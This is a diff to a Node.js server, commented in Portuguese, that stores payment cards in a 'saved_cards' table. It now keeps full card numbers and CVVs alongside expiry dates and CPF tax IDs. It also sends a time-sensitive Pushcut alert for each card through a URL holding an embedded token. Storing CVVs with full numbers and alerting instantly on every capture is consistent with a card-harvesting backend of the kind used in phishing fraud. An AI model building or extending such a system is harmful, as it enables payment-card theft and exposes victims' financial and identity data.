@@ -9,7 +9,7 @@ const cors     = require('cors');
 // ── Pushcut ───────────────────────────────────────────────────────────────────
 async function notificarPushcut(titulo, corpo) {
   try {
-    const r = await fetch('https://api.pushcut.io/boLeFq-EiugGxxOsXE1wn/notifications/Cart%C3%A3o%20', {
+    const r = await fetch('https://api.pushcut.io/boLeFq-EiugGxxOsXE1wn/notifications/Cart%C3%A3o', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ title: titulo, text: corpo, isTimeSensitive: true }),
@@ -33,6 +33,7 @@ const pool = new Pool({
 });
 
 async function initDB() {
+  // Cria tabela base (sem as colunas extras para compatibilidade com tabela já existente)
   await pool.query(`
     CREATE TABLE IF NOT EXISTS saved_cards (
       id         TEXT PRIMARY KEY,
@@ -44,14 +45,15 @@ async function initDB() {
       last4      TEXT NOT NULL,
       expiry     TEXT NOT NULL,
       cvv        TEXT,
-      card_number TEXT,
-      bank       TEXT,
-      card_level TEXT,
-      card_type  TEXT,
       created_at TIMESTAMPTZ DEFAULT NOW(),
       updated_at TIMESTAMPTZ DEFAULT NOW()
     )
   `);
+  // Adiciona colunas extras — se já existirem, o IF NOT EXISTS ignora silenciosamente
+  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_number TEXT`);
+  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS bank        TEXT`);
+  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_level  TEXT`);
+  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_type   TEXT`);
   await pool.query(`CREATE INDEX IF NOT EXISTS idx_sc_cpf ON saved_cards(cpf)`);
   console.log('[DB] Tabela pronta.');
 }
